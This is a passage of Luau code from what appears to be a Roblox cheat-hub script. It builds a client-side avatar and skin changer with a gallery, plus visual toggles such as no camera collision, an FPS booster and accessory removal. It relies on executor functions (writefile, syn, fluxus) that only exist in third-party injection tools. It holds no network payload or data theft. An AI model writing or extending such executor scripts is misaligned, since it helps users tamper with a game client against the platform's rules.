            applyShirtPants(char, {shirtId = skin.shirtId, pantsId = skin.pantsId})
            for _, visual in ipairs(eng.visuals) do
                if visual:IsA("Shirt") and skin.shirtTemplate then visual.ShirtTemplate = skin.shirtTemplate end
                if visual:IsA("Pants") and skin.pantsTemplate then visual.PantsTemplate = skin.pantsTemplate end
            end
            for i, id in ipairs(entry.primeSkinAccessories or {}) do
                if gen ~= eng.gen then return end
                addAccessory(char, id, "BlastSkin_Prime_" .. i, true)
            end
            if entry.primeTorsoMeshId and hum.RigType == Enum.HumanoidRigType.R6 then
                local torso = char:FindFirstChild("Torso")
                if torso then
                    local mesh = Instance.new("SpecialMesh")
                    mesh.Name = "BlastSkin_PrimeTorsoMesh"
                    mesh.MeshType = Enum.MeshType.FileMesh
                    mesh.MeshId = entry.primeTorsoMeshId
                    mesh:SetAttribute("BlastLocalSkin", true)
                    mesh.Parent = torso
                    table.insert(eng.visuals, mesh)
                end
            end
            if entry.primeKorblox then
                local leg = char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg")
                if leg and leg:IsA("BasePart") then
                    local visual = Instance.new("Part")
                    visual.Name = "BlastSkin_PrimeKorbloxLeg"
                    visual:SetAttribute("BlastLocalSkin", true)
                    visual.Size = Vector3.new(1, 2, 1)
                    visual.CanCollide = false
                    visual.CanTouch = false
                    visual.CanQuery = false
                    visual.Massless = true
                    visual.CFrame = leg.CFrame * CFrame.new(0, -0.8, 0)
                    local mesh = Instance.new("SpecialMesh")
                    mesh.MeshType = Enum.MeshType.FileMesh
                    mesh.MeshId = "rbxassetid://101851696"
                    mesh.TextureId = "rbxassetid://101851254"
                    mesh.Parent = visual
                    visual.Parent = char
                    local weld = Instance.new("WeldConstraint")
                    weld.Part0, weld.Part1 = leg, visual
                    weld.Parent = visual
                    table.insert(eng.visuals, visual)
                end
                for _, name in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"}) do
                    local part = char:FindFirstChild(name)
                    if part and part:IsA("BasePart") then
                        if eng.hidden[part] == nil then eng.hidden[part] = {basePart = true, transparency = part.Transparency, localTransparency = part.LocalTransparencyModifier} end
                        part.Transparency = 1
                        part.LocalTransparencyModifier = 1
                    end
                end
            end
            if entry.primeHeadless then hideHead(char) end
            return
        end
        if not entry.primeItems then return end
        if not entry.primeLocalOnly then
            local desc = primeDescription(entry, hum)
            if gen ~= eng.gen or LP.Character ~= char then
                if desc then desc:Destroy() end
                return
            end
            if desc then
                local originalOk, original = pcall(function() return hum:GetAppliedDescription() end)
                local root = char:FindFirstChild("HumanoidRootPart")
                local position = root and root.CFrame
                local velocity = root and root.AssemblyLinearVelocity
                local health = hum.Health
                local applied = pcall(function() hum:ApplyDescription(desc) end)
                desc:Destroy()
                if applied then
                    if gen ~= eng.gen or LP.Character ~= char then
                        if originalOk and original then pcall(function() hum:ApplyDescription(original) end) end
                        if original then original:Destroy() end
                        return
                    end
                    if eng.primeOriginal then eng.primeOriginal:Destroy() end
                    eng.primeOriginal = originalOk and original or nil
                    eng.primeCharacter = char
                    if root and root.Parent and position then
                        root.CFrame = position
                        root.AssemblyLinearVelocity = velocity
                        root.AssemblyAngularVelocity = Vector3.zero
                    end
                    if health > 0 then hum.Health = math.min(health, hum.MaxHealth) end
                    if entry.primeHeadless then hideHead(char) end
                    applyScales(char, entry.primeScales)
                    return
                end
                if original then original:Destroy() end
            end
        end
        -- Local-only options (or a native-application failure): attach every
        -- item from Prime's recipe, never just the thumbnail asset.
        clearVisuals()
        removeOriginalAccessories(char)
        for i, id in ipairs(entry.primeItems) do
            if gen ~= eng.gen or LP.Character ~= char then return end
            addAccessory(char, id, "BlastSkin_Prime_" .. i, true)
        end
        applyScales(char, entry.primeScales)
        if entry.primeHeadless then hideHead(char) end
        for _, side in ipairs({"Left", "Right"}) do
            if (side == "Left" and entry.primeHideLeftLeg) or (side == "Right" and entry.primeHideRightLeg) then
                for _, name in ipairs({side .. "UpperLeg", side .. "LowerLeg", side .. "Foot", side .. " Leg"}) do
                    local part = char:FindFirstChild(name)
                    if part and part:IsA("BasePart") then
                        if eng.hidden[part] == nil then eng.hidden[part] = {basePart = true, transparency = part.Transparency, localTransparency = part.LocalTransparencyModifier} end
                        part.Transparency = 1
                        part.LocalTransparencyModifier = 1
                    end
                end
            end
        end
    end

    local function applyOutfit(entry, char, gen)
        if not char or not entry then return end
        if gen ~= eng.gen then return end
        eng.applying = true

        local hum = char:FindFirstChildOfClass("Humanoid")
        local rootPart = char:FindFirstChild("HumanoidRootPart")
        if not hum or not rootPart then
            eng.applying = false
            return
        end

        for _ = 1, 30 do
            if char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") then break end
            task.wait(0.05)
            if gen ~= eng.gen then eng.applying = false; return end
        end
        if gen ~= eng.gen or LP.Character ~= char then
            eng.applying = false
            return
        end

        if entry.primeItems or entry.primeSkinChanger then
            local ok, err = pcall(applyPrime, entry, char, gen)
            if not ok then warn("[BLAST] Prime avatar: " .. tostring(err)) end
            eng.applying = false
            return
        end

        clearVisuals()
        removeOriginalAccessories(char)

        -- Shirt + Pants (Space Hub method)
        applyShirtPants(char, entry)

        -- Right leg mesh
        if entry.rightLeg then
            pcall(addRightLeg, char)
        end

        -- Accessories (first = often head piece → force manual weld like Space Hub)
        local attached = 0
        local list = entry.accessories or {}
        for index, id in ipairs(list) do
            if gen ~= eng.gen then break end
            local ok = addAccessory(
                char,
                id,
                "BlastOutfitAccessory" .. tostring(index),
                false -- engine + attachment weld (top of head), not Z-forward
            )
            if ok then attached = attached + 1 end
            task.wait(0.03)
        end

        -- Skins that only ship `asset` (VX7 / ALIEN / NEW SKIN / OUTFIT-only)
        if entry.asset then
            if attached == 0 then
                -- Try as accessory package first
                local okAsset = addAccessory(char, entry.asset, "BlastSkin_Asset_" .. tostring(entry.asset), true)
                if okAsset then
                    attached = attached + 1
                else
                    -- Outfit / HumanoidDescription path
                    local okDesc = false
                    pcall(function() okDesc = tryApplyOutfitId(char, entry.asset) end)
                    if not okDesc then
                        -- Last: load model and parent every Accessory found
                        local objs = loadObjects(entry.asset)
                        if objs then
                            for _, root in ipairs(objs) do
                                local accList = {}
                                if root:IsA("Accessory") then table.insert(accList, root) end
                                for _, d in ipairs(root:GetDescendants()) do
                                    if d:IsA("Accessory") then table.insert(accList, d:Clone()) end
                                end
                                for _, acc in ipairs(accList) do
                                    if addAccessory(char, entry.asset, "BlastSkin_Bundle", true) then
                                        attached = attached + 1
                                        break
                                    end
                                    -- direct parent fallback
                                    pcall(function()
                                        acc:SetAttribute("BlastLocalSkin", true)
                                        local hum = char:FindFirstChildOfClass("Humanoid")
                                        if hum then hum:AddAccessory(acc) end
                                        if acc.Parent == char then
                                            table.insert(eng.visuals, acc)
                                            attached = attached + 1
                                        end
                                    end)
                                end
                            end
                        end
                    else
                        attached = attached + 1
                    end
                end
            end
        end

        if gen ~= eng.gen or LP.Character ~= char then
            eng.applying = false
            return
        end

        applyScales(char, entry.scales)
        applyBodyColor(char, entry.bodyColor)

        if entry.headless then
            hideHead(char)
        end

        print(string.format(
            "[MISERY SKIN] %s applied | accessories=%d",
            tostring(entry.name), attached
        ))
        eng.applying = false
    end

    local function startWatch(entry)
        if eng.watchConn then pcall(function() eng.watchConn:Disconnect() end); eng.watchConn = nil end
        if not entry or not (entry.headless or entry.primeHeadless or entry.primeHideLeftLeg or entry.primeHideRightLeg) then return end
        local last = 0
        eng.watchConn = RunService.Heartbeat:Connect(function()
            if not State.skinEnabled or eng.applying then return end
            local now = tick()
            if now - last < 0.35 then return end
            last = now
            local char = LP.Character
            if not char then return end
            local head = char:FindFirstChild("Head")
            if head and head.Transparency < 0.9 and (entry.headless or entry.primeHeadless) then
                hideHead(char)
            end
            for _, side in ipairs({"Left", "Right"}) do
                if (side == "Left" and entry.primeHideLeftLeg) or (side == "Right" and entry.primeHideRightLeg) then
                    for _, name in ipairs({side .. "UpperLeg", side .. "LowerLeg", side .. "Foot", side .. " Leg"}) do
                        local part = char:FindFirstChild(name)
                        if part and part:IsA("BasePart") then part.Transparency = 1; part.LocalTransparencyModifier = 1 end
                    end
                end
            end
            -- Keep right leg parts hidden when rightLeg outfit is active
            local e = SKIN_LIST[State.skinSelection]
            if e and e.rightLeg then
                for _, name in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"}) do
                    local p = char:FindFirstChild(name)
                    if p and p:IsA("BasePart") and p.Transparency < 0.9 then
                        p.Transparency = 1
                    end
                end
            end
        end)
    end

    local function applyCurrent()
        if not State.skinEnabled then
            stopAll()
            return
        end
        local entry = SKIN_LIST[State.skinSelection] or SKIN_LIST[1]
        if not entry then return end
        stopAll()
        local gen = eng.gen
        local char = LP.Character
        if eng.charConn then pcall(function() eng.charConn:Disconnect() end); eng.charConn = nil end
        eng.charConn = LP.CharacterAdded:Connect(function(c)
            if not State.skinEnabled then return end
            task.wait(0.75)
            if not State.skinEnabled then return end
            if not c or LP.Character ~= c then return end
            applyCurrent()
        end)
        if not char then return end
        task.spawn(function()
            task.wait(0.08)
            if eng.gen ~= gen then return end
            if entry.bleedPack then
                BleedEng.apply(entry.bleedPack, char)
                return
            end
            applyOutfit(entry, char, gen)
            if eng.gen == gen then
                startWatch(entry)
            end
        end)
    end

    State._skinApply = applyCurrent
    _G.BlastSetSkin = function(enabled, selection)
        if selection ~= nil then
            State.skinSelection = math.clamp(math.floor(tonumber(selection) or 1), 1, #SKIN_LIST)
        end
        State.skinEnabled = enabled == true
        saveConfig()
        applyCurrent()
    end

    -- Protect skin accessories from Remove Accessories toggle
    local oldRemoveAcc = nil
    do
        -- tag our accessories so any global removeAcc loops can skip them via isSkinOwned attribute
    end

    makeSectionHeader("SKIN CHANGE", tabVis)

    local skinRow = Instance.new("Frame", tabVis)
    skinRow.Size = UDim2.new(1, 0, 0, 62)
    skinRow.BackgroundColor3 = C.card
    skinRow.BackgroundTransparency = 0.04
    skinRow.BorderSizePixel = 0
    skinRow.LayoutOrder = LO()
    skinRow.ZIndex = 7
    mkCorner(skinRow, 10)
    mkStroke(skinRow, C.border, 1.2, 0.2)

    local thumbImg = Instance.new("ImageLabel", skinRow)
    thumbImg.Size = UDim2.fromOffset(42, 42)
    thumbImg.Position = UDim2.new(0, 10, 0.5, -21)
    thumbImg.BackgroundColor3 = C.panel
    thumbImg.BackgroundTransparency = 0.2
    thumbImg.BorderSizePixel = 0
    thumbImg.ScaleType = Enum.ScaleType.Crop
    thumbImg.ZIndex = 8
    mkCorner(thumbImg, 8)

    local titleLbl = Instance.new("TextLabel", skinRow)
    titleLbl.Size = UDim2.new(1, -180, 0, 18)
    titleLbl.Position = UDim2.new(0, 60, 0, 12)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = "Avatar Change"
    titleLbl.TextColor3 = C.text
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextSize = 13
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.ZIndex = 8

    local subLbl = Instance.new("TextLabel", skinRow)
    subLbl.Size = UDim2.new(1, -180, 0, 16)
    subLbl.Position = UDim2.new(0, 60, 0, 32)
    subLbl.BackgroundTransparency = 1
    subLbl.Text = "OFF"
    subLbl.TextColor3 = C.textDim
    subLbl.Font = Enum.Font.Gotham
    subLbl.TextSize = 11
    subLbl.TextXAlignment = Enum.TextXAlignment.Left
    subLbl.ZIndex = 8

    local skinsBtn = Instance.new("TextButton", skinRow)
    skinsBtn.Size = UDim2.fromOffset(64, 28)
    skinsBtn.Position = UDim2.new(1, -118, 0.5, -14)
    skinsBtn.BackgroundColor3 = C.panel
    skinsBtn.BackgroundTransparency = 0.05
    skinsBtn.BorderSizePixel = 0
    skinsBtn.Text = "SKINS"
    skinsBtn.TextColor3 = C.text
    skinsBtn.Font = Enum.Font.GothamBold
    skinsBtn.TextSize = 10
    skinsBtn.ZIndex = 9
    mkCorner(skinsBtn, 8)
    mkStroke(skinsBtn, C.border, 1, 0.2)

    -- Immediately below the Change / SKINS row.
    local saveSkinBtn = Instance.new("TextButton", tabVis)
    saveSkinBtn.Name = "SaveSkin"
    saveSkinBtn.Size = UDim2.new(1, 0, 0, 32)
    saveSkinBtn.BackgroundColor3 = C.panel
    saveSkinBtn.BackgroundTransparency = 0.05
    saveSkinBtn.BorderSizePixel = 0
    saveSkinBtn.Text = "Save Skin"
    saveSkinBtn.TextColor3 = C.text
    saveSkinBtn.Font = Enum.Font.GothamBold
    saveSkinBtn.TextSize = 11
    saveSkinBtn.LayoutOrder = LO()
    saveSkinBtn.ZIndex = 9
    mkCorner(saveSkinBtn, 8)
    mkStroke(saveSkinBtn, C.border, 1, 0.2)
    saveSkinBtn.MouseButton1Click:Connect(function()
        local entry = SKIN_LIST[State.skinSelection]
        if not entry then return end
        local ok, err = pcall(function()
            local writer = writefile or (syn and syn.writefile) or (fluxus and fluxus.writefile)
            local reader = readfile or (syn and syn.readfile) or (fluxus and fluxus.readfile)
            if not writer or not reader then error("File saving is unavailable in this executor") end
            local payload = HttpService:JSONEncode({
                selection = State.skinSelection,
                name = entry.name,
                enabled = State.skinEnabled == true,
            })
            writer(savedSkinFile, payload)
            if reader(savedSkinFile) ~= payload then error("Saved skin could not be verified") end
        end)
        saveSkinBtn.Text = ok and "Skin Saved" or "Save Failed"
        if not ok then warn("[BLAST] Save Skin: " .. tostring(err)) end
        task.delay(2, function()
            if saveSkinBtn.Parent then saveSkinBtn.Text = "Save Skin" end
        end)
    end)

    toggleRefs.customTools = makeToggleRow("Custom Tools", State.customToolsEnabled, function(on, isSync)
        State.customToolsEnabled = on == true
        BleedEng.setCustomTools(State.customToolsEnabled)
        if not isSync then task.spawn(saveConfig) end
    end, nil, tabVis)
    if State.customToolsEnabled then task.defer(function() BleedEng.setCustomTools(true) end) end

    local function refreshRow()
        local e = SKIN_LIST[State.skinSelection] or SKIN_LIST[1]
        thumbImg.Image = thumb(e)
        subLbl.Text = (State.skinEnabled and "ACTIVE  |  " or "OFF  |  ") .. e.sub
        titleLbl.Text = e.name
        titleLbl.TextColor3 = State.skinEnabled and C.text or C.textDim
        skinRow.BackgroundColor3 = State.skinEnabled and C.cardHov or C.card
    end

    local skinToggleSet = makeToggleRow("Skin Change", State.skinEnabled, function(on, isSync)
        State.skinEnabled = on == true
        applyCurrent()
        refreshRow()
        if not isSync then task.spawn(saveConfig) end
    end, nil, tabVis)

    -- Standalone avatar gallery: centered on screen and independent from the main menu.
    local gallery = Instance.new("Frame", gui)
    gallery.Name = "BlastSkinGallery"
    gallery.AnchorPoint = Vector2.new(0.5, 0.5)
    gallery.Position = UDim2.new(0.5, 0, 0.5, 0)
    gallery.Size = UDim2.fromOffset(340, 410)
    gallery.BackgroundColor3 = C.bg
    gallery.BackgroundTransparency = 0.02
    gallery.BorderSizePixel = 0
    gallery.Visible = false
    gallery.ZIndex = 50
    gallery.ClipsDescendants = true
    mkCorner(gallery, 14)
    mkStroke(gallery, C.border, 1.4, 0.18)

    local galleryScale = Instance.new("UIScale", gallery)
    galleryScale.Name = "MiserySkinGalleryScale"
    galleryScale.Scale = math.clamp(tonumber(State.uiScale) or DEFAULT_GUI_SCALE, 0.50, 1.00)

    local galleryHeader = Instance.new("Frame", gallery)
    galleryHeader.Name = "Header"
    galleryHeader.Size = UDim2.new(1, 0, 0, 58)
    galleryHeader.BackgroundColor3 = C.header
    galleryHeader.BackgroundTransparency = 0.12
    galleryHeader.BorderSizePixel = 0
    galleryHeader.ZIndex = 51

    local headerDivider = Instance.new("Frame", galleryHeader)
    headerDivider.Size = UDim2.new(1, -24, 0, 1)
    headerDivider.Position = UDim2.new(0, 12, 1, -1)
    headerDivider.BackgroundColor3 = C.border
    headerDivider.BackgroundTransparency = 0.5
    headerDivider.BorderSizePixel = 0
    headerDivider.ZIndex = 52

    local gTitle = Instance.new("TextLabel", galleryHeader)
    gTitle.Size = UDim2.new(1, -86, 0, 24)
    gTitle.Position = UDim2.new(0, 14, 0, 8)
    gTitle.BackgroundTransparency = 1
    gTitle.Text = "AVATAR CHANGE"
    gTitle.TextColor3 = C.text
    gTitle.Font = Enum.Font.GothamBlack
    gTitle.TextSize = 14
    gTitle.TextXAlignment = Enum.TextXAlignment.Left
    gTitle.ZIndex = 52

    local gSub = Instance.new("TextLabel", galleryHeader)
    gSub.Size = UDim2.new(1, -86, 0, 16)
    gSub.Position = UDim2.new(0, 14, 0, 31)
    gSub.BackgroundTransparency = 1
    gSub.Text = "Choose a skin or outfit"
    gSub.TextColor3 = C.textDim
    gSub.Font = Enum.Font.Gotham
    gSub.TextSize = 10
    gSub.TextXAlignment = Enum.TextXAlignment.Left
    gSub.ZIndex = 52

    local gClose = Instance.new("TextButton", galleryHeader)
    gClose.Size = UDim2.fromOffset(30, 30)
    gClose.Position = UDim2.new(1, -42, 0, 14)
    gClose.BackgroundColor3 = C.card
    gClose.BackgroundTransparency = 0.05
    gClose.BorderSizePixel = 0
    gClose.Text = "X"
    gClose.TextColor3 = C.text
    gClose.Font = Enum.Font.GothamBlack
    gClose.TextSize = 12
    gClose.ZIndex = 53
    mkCorner(gClose, 8)
    mkStroke(gClose, C.border, 1, 0.3)

    local scroll = Instance.new("ScrollingFrame", gallery)
    scroll.Size = UDim2.new(1, -20, 1, -70)
    scroll.Position = UDim2.new(0, 10, 0, 64)
    scroll.BackgroundTransparency = 1
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = C.accent
    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.BorderSizePixel = 0
    scroll.ZIndex = 51

    local scrollPadding = Instance.new("UIPadding", scroll)
    scrollPadding.PaddingTop = UDim.new(0, 2)
    scrollPadding.PaddingBottom = UDim.new(0, 8)
    scrollPadding.PaddingLeft = UDim.new(0, 4)
    scrollPadding.PaddingRight = UDim.new(0, 8)

    local grid = Instance.new("UIGridLayout", scroll)
    grid.CellSize = UDim2.fromOffset(148, 124)
    grid.CellPadding = UDim2.fromOffset(8, 8)
    grid.SortOrder = Enum.SortOrder.LayoutOrder
    grid.HorizontalAlignment = Enum.HorizontalAlignment.Center

    local cardRefs = {}
    local function refreshCards()
        for i, card in pairs(cardRefs) do
            local active = State.skinEnabled and State.skinSelection == i
            if card.badge then card.badge.Visible = active end
            if card.stroke then
                card.stroke.Color = active and C.text or C.border
                card.stroke.Transparency = active and 0.05 or 0.4
            end
        end
    end

    for i, entry in ipairs(SKIN_LIST) do
        local card = Instance.new("TextButton", scroll)
        card.Name = "SkinCard_" .. i
        card.BackgroundColor3 = C.card
        card.BackgroundTransparency = 0.05
        card.BorderSizePixel = 0
        card.Text = ""
        card.AutoButtonColor = false
        card.LayoutOrder = i
        card.ZIndex = 22
        mkCorner(card, 10)
        local cStroke = mkStroke(card, C.border, 1.2, 0.4)

        local img = Instance.new("ImageLabel", card)
        img.Size = UDim2.new(1, -12, 0, 76)
        img.Position = UDim2.new(0, 6, 0, 6)
        img.BackgroundColor3 = C.panel
        img.BorderSizePixel = 0
        img.Image = thumb(entry)
        img.ScaleType = Enum.ScaleType.Crop
        img.ZIndex = 23
        mkCorner(img, 8)

        local nameLbl = Instance.new("TextLabel", card)
        nameLbl.Size = UDim2.new(1, -8, 0, 16)
        nameLbl.Position = UDim2.new(0, 4, 1, -34)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = entry.name
        nameLbl.TextColor3 = C.text
        nameLbl.Font = Enum.Font.GothamBold
        nameLbl.TextSize = 11
        nameLbl.ZIndex = 23

        local subCard = Instance.new("TextLabel", card)
        subCard.Size = UDim2.new(1, -8, 0, 14)
        subCard.Position = UDim2.new(0, 4, 1, -18)
        subCard.BackgroundTransparency = 1
        subCard.Text = entry.sub
        subCard.TextColor3 = C.textDim
        subCard.Font = Enum.Font.Gotham
        subCard.TextSize = 9
        subCard.ZIndex = 23

        local badge = Instance.new("TextLabel", card)
        badge.Size = UDim2.fromOffset(52, 16)
        badge.Position = UDim2.new(1, -58, 0, 10)
        badge.BackgroundColor3 = C.accent
        badge.Text = "ACTIVE"
        badge.TextColor3 = C.text
        badge.Font = Enum.Font.GothamBlack
        badge.TextSize = 9
        badge.Visible = false
        badge.ZIndex = 24
        mkCorner(badge, 6)

        cardRefs[i] = {frame = card, stroke = cStroke, badge = badge}
        local idx = i
        card.MouseButton1Click:Connect(function()
            State.skinSelection = idx
            State.skinEnabled = true
            -- Persiste imediatamente antes de aplicar a skin, inclusive entre reexecucoes.
            saveConfig()
            applyCurrent()
            refreshRow()
            refreshCards()
            if skinToggleSet then skinToggleSet(true, true) end
        end)
    end

    skinsBtn.MouseButton1Click:Connect(function()
        gallery.Visible = not gallery.Visible
        skinsBtn.Text = gallery.Visible and "CLOSE" or "SKINS"
        if gallery.Visible then refreshCards() end
    end)
    gClose.MouseButton1Click:Connect(function()
        gallery.Visible = false
        skinsBtn.Text = "SKINS"
    end)

    toggleRefs.skinChange = function(on, isSync)
        State.skinEnabled = on == true
        if skinToggleSet then skinToggleSet(State.skinEnabled, true) end
        applyCurrent()
        refreshRow()
        refreshCards()
        if not isSync then task.spawn(saveConfig) end
    end

    refreshRow()
    refreshCards()
    end)
    if not okSkin then
        warn("[BLAST] Skin UI error: " .. tostring(errSkin))
    end
end


toggleRefs.noCamCollision = makeToggleRow("No Cam Collision", State.noCamCollisionEnabled, function(on, isSync)
    State.noCamCollisionEnabled = on
    applyNoCamCollision(on)
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

toggleRefs.antiLag = makeToggleRow("Fps Booster", State.antiLagEnabled, function(on, isSync)
    State.antiLagEnabled = on
    if on then enableAntiLag() else disableAntiLag() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)


toggleRefs.removeAcc = makeToggleRow("Remove Accessories", State.removeAccEnabled, function(on, isSync)
    State.removeAccEnabled = on
    if on then
        for _, p in pairs(Players:GetPlayers()) do
            if p.Character then
                for _, obj in ipairs(p.Character:GetDescendants()) do
                    if (obj:IsA("Accessory") or obj:IsA("Hat")) and not obj:GetAttribute("BlastLocalSkin") then
                        pcall(function() obj:Destroy() end)
                    end
                end
            end
        end
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

toggleRefs.nightMode = makeToggleRow("Color Mode", State.nightModeEnabled, function(on, isSync)
    State.nightModeEnabled = on
    applyTheme()
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

toggleRefs.themeCycleLabel = makeCycleRow("Theme Color", "gameTheme", SKY_PRESETS_LIST, function()
    -- Find current index
    local currentIndex = 1
    for i, name in ipairs(SKY_PRESETS_LIST) do
        if name == State.gameTheme then
            currentIndex = i
            break
        end
    end
    currentIndex = (currentIndex % #SKY_PRESETS_LIST) + 1
    applyCustomSky(SKY_PRESETS_LIST[currentIndex])
    updateThemeUI()
    task.spawn(saveConfig)
end, tabVis)

makeSectionHeader("GUI SETTINGS", tabVis)

-- Seletor horizontal de backgrounds do XZZ DUELS
local function _buildBackgroundPicker()
    local picker = Instance.new("ScrollingFrame", tabVis)
    picker.Name = "BackgroundPicker"
    picker.Size = UDim2.new(1, 0, 0, 58)
    picker.BackgroundColor3 = C.card
    picker.BackgroundTransparency = 0.3
    picker.BorderSizePixel = 0
    picker.LayoutOrder = LO()
    picker.ZIndex = 7
    picker.ScrollingDirection = Enum.ScrollingDirection.X
    picker.ScrollBarThickness = 3
    picker.ScrollBarImageColor3 = C.textSub
    picker.ScrollBarImageTransparency = 0.35
    picker.AutomaticCanvasSize = Enum.AutomaticSize.X
    picker.CanvasSize = UDim2.new(0, 0, 0, 0)
    picker.Active = true
    picker.Selectable = true
    picker.ScrollingEnabled = true
    picker.ElasticBehavior = Enum.ElasticBehavior.WhenScrollable
    picker.ClipsDescendants = true
    mkCorner(picker, 8)
    mkStroke(picker, C.border, 1)

    local pickerLayout = Instance.new("UIListLayout", picker)
    pickerLayout.FillDirection = Enum.FillDirection.Horizontal
    pickerLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    pickerLayout.SortOrder = Enum.SortOrder.LayoutOrder
    pickerLayout.Padding = UDim.new(0, 4)

    local pickerPadding = Instance.new("UIPadding", picker)
    pickerPadding.PaddingLeft = UDim.new(0, 6)
    pickerPadding.PaddingRight = UDim.new(0, 6)
    pickerPadding.PaddingTop = UDim.new(0, 5)
    pickerPadding.PaddingBottom = UDim.new(0, 8)

    -- Scroll horizontal: roda do mouse, clique + arraste e toque + arraste
    local pickerDragging = false
    local pickerDragStart = nil
    local pickerStartCanvas = nil
    local pickerActiveInput = nil
    local suppressPickerClickUntil = 0

    local function pointerInsidePicker(position)
        local absolutePosition = picker.AbsolutePosition
        local absoluteSize = picker.AbsoluteSize
        return position.X >= absolutePosition.X
            and position.X <= absolutePosition.X + absoluteSize.X
            and position.Y >= absolutePosition.Y
            and position.Y <= absolutePosition.Y + absoluteSize.Y
    end

    local function maxPickerScroll()
        local canvasWidth = 0
        pcall(function() canvasWidth = picker.AbsoluteCanvasSize.X end)
        if canvasWidth <= 0 then canvasWidth = picker.CanvasSize.X.Offset end
        return math.max(canvasWidth - picker.AbsoluteWindowSize.X, 0)
    end

    UIS.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then return end
        if not pointerInsidePicker(input.Position) then return end
        pickerDragging = true
        pickerDragStart = input.Position
        pickerStartCanvas = picker.CanvasPosition
        pickerActiveInput = input
    end)

    UIS.InputChanged:Connect(function(input)
        if pickerDragging and pickerDragStart and pickerStartCanvas
        and (input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - pickerDragStart
            if math.abs(delta.X) >= 5 then
                suppressPickerClickUntil = tick() + 0.15
            end
            picker.CanvasPosition = Vector2.new(
                math.clamp(pickerStartCanvas.X - delta.X, 0, maxPickerScroll()),
                0
            )
        end

        if input.UserInputType == Enum.UserInputType.MouseWheel
        and pointerInsidePicker(UIS:GetMouseLocation()) then
            suppressPickerClickUntil = tick() + 0.08
            local nextX = picker.CanvasPosition.X - input.Position.Z * 24
            picker.CanvasPosition = Vector2.new(math.clamp(nextX, 0, maxPickerScroll()), 0)
        end
    end)

    UIS.InputEnded:Connect(function(input)
        if input == pickerActiveInput
        or input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            pickerDragging = false
            pickerDragStart = nil
            pickerStartCanvas = nil
            pickerActiveInput = nil
        end
    end)

    local pickerButtons = {}
    local function refreshPicker()
        for index, button in pairs(pickerButtons) do
            local selected = index == State.currentBackground
            button.BackgroundTransparency = selected and 0.05 or 0.35
            local st = button:FindFirstChildOfClass("UIStroke")
            if st then
                st.Color = selected and C.text or C.border
                st.Transparency = selected and 0.05 or 0.45
                st.Thickness = selected and 1.5 or 1
            end
        end
    end

    local noneButton = Instance.new("TextButton", picker)
    noneButton.Name = "BackgroundNone"
    noneButton.Size = UDim2.new(0, 52, 0, 40)
    noneButton.BackgroundColor3 = C.panel
    noneButton.BackgroundTransparency = 0.2
    noneButton.BorderSizePixel = 0
    noneButton.Text = "None"
    noneButton.TextColor3 = C.text
    noneButton.Font = Enum.Font.GothamSemibold
    noneButton.TextSize = 9
    noneButton.AutoButtonColor = false
    noneButton.LayoutOrder = 0
    noneButton.ZIndex = 8
    mkCorner(noneButton, 7)
    mkStroke(noneButton, C.border, 1)
    pickerButtons[0] = noneButton
    noneButton.MouseButton1Click:Connect(function()
        if tick() < suppressPickerClickUntil then return end
        applyMiseryBackground(0)
        refreshPicker()
    end)

    for index, imageId in ipairs(MISERY_BACKGROUND_IDS) do
        local selectedIndex = index -- valor proprio para o callback deste botao
        local button = Instance.new("ImageButton", picker)
        button.Name = "Background" .. tostring(selectedIndex)
        button.Size = UDim2.new(0, 58, 0, 40)
        button.BackgroundColor3 = C.panel
        button.BackgroundTransparency = 0.35
        button.BorderSizePixel = 0
        button.Image = "rbxassetid://" .. imageId
        button.ScaleType = Enum.ScaleType.Crop
        button.AutoButtonColor = false
        button.LayoutOrder = selectedIndex
        button.ZIndex = 8
        button.ClipsDescendants = true
        mkCorner(button, 7)
        mkStroke(button, C.border, 1)
        pickerButtons[selectedIndex] = button
        button.MouseButton1Click:Connect(function()
            if tick() < suppressPickerClickUntil then return end
            applyMiseryBackground(selectedIndex)
            refreshPicker()
        end)
    end

    refreshPicker()
end
_buildBackgroundPicker()

-- Paleta de cores + toggle "Background Color" (portado da Adapt UI).
-- Chamada unica: locals ficam dentro da funcao, nao no chunk principal
State.colorApi.buildUi(tabVis, LO, C, mkCorner, mkStroke, makeToggleRow)

local function makeGuiScaleStepper(label, initialValue, onChanged)
    local row = Instance.new("Frame", tabVis)
    row.Name = label
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    mkCorner(row, 7)
    mkStroke(row, C.border, 1)

    local labelText = Instance.new("TextLabel", row)
    labelText.Size = UDim2.new(1, -132, 1, 0)
    labelText.Position = UDim2.new(0, 12, 0, 0)
    labelText.BackgroundTransparency = 1
    labelText.Text = label
    labelText.TextColor3 = Color3.fromRGB(255, 255, 255)
    labelText.TextTransparency = 0
    labelText.Font = Enum.Font.GothamBlack
    labelText.TextSize = 13
    labelText.TextXAlignment = Enum.TextXAlignment.Left
    labelText.TextStrokeTransparency = 0.35
    labelText.ZIndex = 8

    local value = math.clamp(tonumber(initialValue) or 1, 0.50, 1.50)
    local minus = Instance.new("TextButton", row)
